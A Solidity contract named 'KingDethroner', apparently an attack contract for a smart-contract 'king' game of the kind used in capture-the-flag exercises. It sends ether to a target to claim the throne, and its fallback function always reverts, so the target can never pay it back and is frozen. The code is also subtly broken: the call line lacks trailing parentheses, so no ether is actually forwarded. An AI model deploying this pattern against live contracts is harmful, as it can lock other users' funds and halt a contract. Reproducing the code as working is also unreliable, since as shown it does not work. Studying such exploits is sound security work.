```
pragma solidity ^0.4.18;

contract KingDethroner {
    function dethrone(address _target) public payable {
        _target.call.value(msg.value);
    }

    function() public payable {
        revert();
    }
}
```